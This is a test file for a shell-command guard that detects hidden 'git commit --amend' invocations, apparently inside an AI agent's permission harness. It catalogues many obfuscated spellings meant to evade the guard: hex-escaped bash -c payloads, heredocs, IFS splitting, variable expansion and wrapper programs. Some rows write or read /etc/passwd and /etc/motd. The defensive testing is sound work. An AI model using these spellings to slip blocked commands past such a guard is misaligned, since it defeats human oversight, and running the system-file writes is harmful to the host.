    "ls | xargs -n 1 bash -c 'git commit -m x --amend'",
    // A glued redirection's target is not the program.
    ">log bash -c 'git commit -m x --amend'",
    "2>/dev/null bash -c $'git\\x20commit\\x20--amend'",
    // env's -u consumes HOME; -S carries the payload behind it.
    "env -u HOME -S $'git commit --am\\x65nd'",
    // util-linux su spells -c as --command / --session-command (su(1)).
    "su --command $'git commit --am\\x65nd'",
    "su --session-command $'git commit --am\\x65nd'",
    "su --command=$'git\\x20commit\\x20--amend'",
    // bash reads letters after `c` as options, never as an attached payload
    // (witnessed: `bash -c'…'` errors); the position is unclassifiable.
    "find . -exec bash -ce $'git\\x20commit\\x20--amend' {} \\;",
    // -o consumes its option name before -c reads the next word.
    "sudo bash -o posix -c $'git commit --am\\x65nd'",
    "ksh -o errexit -c $'git\\x20commit\\x20--amend'",
    // setsid is a transparent prefix; the heredoc body is bash's program.
    "setsid bash <<'EOF'\ngit commit --amend\nEOF",
    // A process substitution is the script a stdin shell runs; its text is
    // generated, so the position fails closed (witnessed to amend).
    "bash <(printf $'git\\x20commit\\x20--amend')",
    // A substitution body decodes to text with real separators before the
    // producer shell writes it.
    "echo $(printf $'git\\x20commit\\x20--amend') | bash",
    // >| is the clobber-override redirection, not a pipe: one command.
    'git >| /dev/null commit --amend',
    'git <> /dev/null commit --amend',
    // An unresolved expansion in payload position can be `--`, making the
    // FOLLOWING word the command; no program is provable, so fail closed.
    "bash -c $TERM $'git\\x20commit\\x20--amend'",
  ])('denies a wrapper spelling that really amends: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(true);
  });

  it.each([
    // An ANSI-C word in a plain argument is data: the recognizer must not
    // decode it into a phantom invocation.
    "grep $'git\\x20commit\\x20--amend' file.txt",
    // A bare shell operand of xargs/find receives data, not a program.
    'ls | xargs sh',
    'find . -name bash',
    // A decodable ANSI-C payload is readable text, not an unresolvable
    // expansion: an inert one stays allowed.
    "bash -c $'echo hi'",
    "echo x && bash -c $'echo hi'",
  ])('keeps inert wrapper-adjacent text allowed: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(false);
  });
});

// R12-1 follow-up: `xargs -L N` carries its value as a detached word (GNU
// `L:`), so the program is the word after it. The optional-value table used to
// hold `-L`, which left the position unclassifiable and failed closed: every
// `xargs -L N <program>` pipeline answered "amend" (#16075).
describe('commandContainsGitAmend xargs value-flag attribution', () => {
  it.each([
    'find . -name "*.log" | xargs -L 5 rm',
    'ls | xargs -L 2 echo',
    'echo x | xargs -L 5 rm',
    'find . -name "*.log" | xargs -L5 rm',
    'find . -name "*.log" | xargs -n 1 rm',
    'ls | xargs --max-lines 5 rm',
  ])('reads the program after the value: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(false);
  });

  it.each([
    'ls | xargs -L 5 git commit --amend',
    "ls | xargs -L 5 sh -c 'git commit --amend'",
    'ls | xargs -L5 git commit --amend',
    'ls | xargs --max-lines 5 git commit -m x --amend',
  ])('still sees an amend behind the value: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(true);
  });

  // `-e`/`-l` keep an OPTIONAL attached value, so a detached word there cannot
  // be told from the program: that position stays fail-closed on purpose.
  it.each([
    'ls | xargs -e END rm',
    'ls | xargs -l rm',
    'ls | xargs -e END git commit --amend',
  ])('still fails closed on a detached optional value: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(true);
  });
});

// R1-1 (second round): constructs whose argv or data flow the hand-rolled
// model cannot positively compute. Each row returns `false` at 3375347b8 while
// real bash amends, so the recogniser now reads the construct both ways and
// fails closed when neither reading proves the command amend-free.
describe('commandContainsGitAmend fails closed on unprovable constructs', () => {
  it.each([
    // printf splices `%s` from its literal argument.
    "printf 'g%s commit --amend' it | bash",
    // A quoted `-c` payload keeps its backslashes for the printf that decodes
    // them; the raw reading and the unescaped one both have to be analysed.
    'bash -c "printf \'git\\x20commit\\x20--amend\' | bash"',
    // A redirection glued to the shell, or between the shell and `-c`, does not
    // hide the payload.
    'bash<<\'X\' -c "git commit -C HEAD --amend"',
    'bash 2>/dev/null -c "git commit -C HEAD --amend"',
    // script's `-t` takes an ATTACHED value; `-c` still follows.
    "script -t/dev/null -c $'git commit --am\\x65nd'",
    // Pathname expansion decides the program/subcommand/flag word.
    'git commi? --amend',
    'git commit --?mend',
    // IFS decides how the expansion word-splits.
    "IFS=:; X='git:commit:--amend'; $X",
    // An unset expansion expands to nothing, gluing the decisive words.
    "A='git commit'; $A$UNSET_VAR --amend",
    // Options between the shell and `-c`; a shell-fed heredoc; a fed payload
    // shifted by the producer's own option word.
    "bash -c -x 'git commit --amend'",
    "cat <<'EOF' | cat | bash\ngit commit --amend\nEOF",
    "echo -n 'cd /b && git commit --amend' | bash",
  ])('denies a construct the model cannot compute: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(true);
  });

  it.each([
    // The narrowing may only add denials: the inert and allowlisted shapes the
    // base guard already kept have to stay amend-free.
    "cat <<'EOF'\ngit commit --amend\nEOF",
    'git status; echo done',
    "grep $'git\\x20commit\\x20--amend' file.txt",
    // A static value that is not git stays allowed, IFS or not.
    "IFS=:; X='git:status'; $X",
    // An assignment word in argument position sets nothing.
    'echo X=ls; $X',
  ])('keeps a computable or inert command allowed: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(false);
  });
});

// R12-1 (second round): the static value proof may only trust a name when the
// command has no OTHER construct that writes it.
describe('commandContainsGitAmend static value proof is not a proof', () => {
  it.each([
    "X=ls; read X <<< $'git commit --am\\x65nd'; $X",
    "mapfile -t X <<< $'git commit --amend'; $X",
    "IFS=:; X='git:commit:--amend'; $X",
  ])('denies a name written outside NAME=value: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(true);
  });

  // A program word that resolves to static text does not make the REST of the
  // command static: `$Y` in flag position can still be `--amend`
  // (#16075 review, R12-1 second round).
  it.each([
    "X='git commit'; Y='--amend'; $X $Y",
    "X='git'; Y='commit --amend'; $X $Y",
  ])(
    'denies a static program with an expansion in flag position: %s',
    (command) => {
      expect(commandContainsGitAmend(command)).toBe(true);
    },
  );

  it.each([
    // Quoted message data is inert, and a static program with plain flags is
    // not an amend.
    "X='git commit'; $X -m 'msg'",
    "X='git commit'; $X -m 'fix: --amend'",
  ])('keeps a static program with inert arguments allowed: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(false);
  });
});

// R8-2 / R10-1: a trailing `\c` in an ANSI-C word stays literal. Consuming
// the closing quote as its operand left the quote state open and swallowed
// the rest of the line, hiding both the amend and the file operations.
describe('ANSI-C words ending in a literal trailing \\c', () => {
  it('keeps the redirect visible after the word', () => {
    expect(
      extractShellOperationsAcrossCommand("echo $'a\\c' > /etc/motd", '/repo'),
    ).toEqual([write('/etc/motd')]);
  });

  it('keeps later operands visible after the word', () => {
    const ops = extractShellOperationsAcrossCommand(
      "cat $'x\\c' /etc/passwd",
      '/tmp',
    );
    expect(ops.map((op) => op.filePath)).toContain('/etc/passwd');
  });

  it('still decodes \\c with a real operand letter', () => {
    expect(commandContainsGitAmend("git commit -m $'fix \\cZ' --amend")).toBe(
      true,
    );
  });
});

// R13-2 (#16075): a multi-unit ANSI-C escape appends one `bare` entry per UTF-16
// unit of its decoded text, so positional syntax trimming stays aligned and the
// unquoted `)` after an astral filename is dropped, not kept in the path.
describe('ANSI-C astral escape keeps bare aligned with current', () => {
  it('trims the closing paren after a multi-unit escape', () => {
    expect(
      extractShellOperationsAcrossCommand("(cat > $'\\U0001F600')", '/repo'),
    ).toEqual([write('/repo/😀')]);
  });

  it('still trims after a single-unit escape', () => {
    expect(
      extractShellOperationsAcrossCommand("(cat > $'\\x41')", '/repo'),
    ).toEqual([write('/repo/A')]);
  });
});

// R13-1 (#16075): a fully quoted -c payload that carries an expansion is still
// unwrapped for op extraction, so a write inside it is reported (the monitor /
// cron consumers keep the unresolved signal separately).
describe('fully quoted wrapper payload stays visible to op extraction', () => {
  it('reports a write inside a double-quoted payload with a substitution', () => {
    expect(
      extractShellOperationsAcrossCommand(
        'bash -c "echo hi; $(echo x > /etc/passwd)"',
        '/repo',
      ),
    ).toEqual([write('/etc/passwd')]);
  });
});

// R12-1 (#16075): an expanded program word is an amend only when its assigned
// value can yield `git commit --amend` (or is genuinely unresolvable), not for
// every assigned name.
describe('expanded program word resolves the assigned value', () => {
  it.each([
    'X="git status"; $X',
    'PY=python; $PY --version',
    'X="echo hi"; $X',
    '$UNSET_VAR --version',
  ])('allows a non-amend expansion: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(false);
  });

  it.each([
    "X='git commit --amend --no-edit'; $X",
    'X=git; $X commit --amend',
    'X=git; X+=; $X commit --amend',
    "X+=$'git\\x20commit\\x20--amend'; $X",
    'git commit${IFS}--amend',
  ])('denies an expansion that can amend: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(true);
  });
});

// R1-1 (#16075): the recognizer must not answer "not an amend" for constructs
// its model does not model; each row really amends HEAD under real bash.
describe('recognizer closes the unmodelled amend spellings', () => {
  it.each([
    "timeout .5s bash -c $'git\\x20commit\\x20--amend'",
    "exec -a foo bash -c $'git\\x20commit\\x20--amend'",
    "env -S 'git' commit --amend",
    "script -I /dev/null -c $'git\\x20commit\\x20--amend'",
    "X+=$'git\\x20commit\\x20--amend'; $X",
    'git commit -m x\\ #y --amend',
    "bash<<'EOF'\ngit commit --amend\nEOF",
    'bash<<<"git commit \'--amend\'"',
    'echo "git commit $\'--amend\'" | cat | bash',
    "printf 'git\\x20commit\\x20--amend' | bash",
    "find . -exec bash +o posix -c 'git commit --am'end \\;",
    "bash -c -x 'git commit --amend'",
  ])('denies an amend the model used to miss: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(true);
  });

  it.each([
    "bash -c $'echo hi'",
    "timeout 5 bash -c $'echo hi'",
    "env -S 'echo hi'",
    "exec -a foo bash -c 'echo hi'",
    'git status # git commit --amend',
    "cat <<'EOF'\ngit commit --amend\nEOF",
    "echo 'git commit --amend'",
    "printf 'echo hi' | bash",
    'git commit -m "x #y" --no-edit',
  ])('keeps the inert twin allowed: %s', (command) => {
    expect(commandContainsGitAmend(command)).toBe(false);
  });
});

// ── #16075 maintainer stopgap: recognition channels ───────────────────────
// The guard hard-denies only `invocation`; `unprovable-text` (backstop-only)
// routes to approval. These pins keep the two channels from drifting back
// into one boolean.
describe('classifyGitAmend channels (issue #13570 maintainer stopgap)', () => {
  it.each([
    'git commit --amend --no-edit',
    "X='git commit --amend --no-edit'; $X",
    "printf 'g%s commit --amend' it | bash",
    "IFS=:; X='git:commit:--amend'; $X",
    'xargs -I{} git commit --amend --no-edit',
    'find . -exec git commit --amend --no-edit \\;',
    "bash <<'EOF'\ngit commit --amend\nEOF",
    // A command glued onto an inert program by comment removal is a real
    // second command, not argument data.
    "echo hi # it's\ngit commit --amend --no-edit",
    // Substitution bodies execute even under an inert program.
    'echo $(git commit --amend --no-edit)',
  ])('positively identifies an invocation: %s', (command) => {
    expect(classifyGitAmend(command)).toBe('invocation');
  });

  it.each([
    // The issue #13570 acceptance anchor and its inert-unprovable siblings.
    `node -e 'console.log("a report about git commit --amend behaviour")'`,
    'echo "git commit --amend"',
    'echo git commit --amend >> CHANGELOG.md',
    "git commit -m 'fix: explain why git commit --amend is blocked'",
    "cat > notes.txt <<'EOF'\ngit commit --amend\nEOF",
    // Carriers the recognizer does not attribute: approval, not denial.
    "trap 'git commit --amend --no-edit' EXIT",
    "bash -c -e 'git commit --amend --no-edit'",
  ])('routes inert-unprovable text to the backstop channel: %s', (command) => {
    expect(classifyGitAmend(command)).toBe('unprovable-text');
    // The boolean contract is the union of both channels.
    expect(commandContainsGitAmend(command)).toBe(true);
  });

  it.each([
    'git status',
    "echo 'git commit --amend'",
    "cat <<'EOF'\ngit commit --amend\nEOF",
    'git status # git commit --amend is blocked',
  ])('recognises nothing amend-related: %s', (command) => {
    expect(classifyGitAmend(command)).toBe('none');
    expect(commandContainsGitAmend(command)).toBe(false);
  });
});
